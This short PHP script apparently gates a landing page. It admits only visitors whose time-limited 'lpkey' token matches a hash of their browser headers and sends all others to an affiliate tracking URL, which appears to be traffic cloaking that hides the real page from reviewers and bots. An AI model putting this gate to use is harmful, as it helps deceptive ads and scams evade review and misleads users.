<?php
session_start();

$e = 'e73cb5da722add2aba83d1a230f8b7c4';
$f = '404';
$g = @$_GET["lpkey"];
date_default_timezone_set('Asia/Shanghai');
$h = substr($g, 0, 2) . substr($g, 4, 2) . substr($g, 8, 2) . substr($g, 12, 2) . substr($g, 16, 2);
$i = substr($g, 2, 2) . substr($g, 6, 2) . substr($g, 10, 2) . substr($g, 14, 2);
$j = md5($e . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $_SERVER["HTTP_USER_AGENT"] . $h);
$j = substr($j, 2, 2) . substr($j, 7, 2) . substr($j, 12, 2) . substr($j, 24, 2);
if (time() > $h || $j !== $i || !isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    header('Location: https://secureconv-smart.com/?a=70580&c=130746');
    exit;
}

$clickid = isset($_GET['s2']) ? $_GET['s2'] : "";
if (!empty($clickid)) {
    $_SESSION['clickid'] = $clickid;
    header('Location: index.php');
    exit;
} else {
    //跳SM
    header('Location: https://secureconv-smart.com/?a=70580&c=130746');
    exit;
}
?>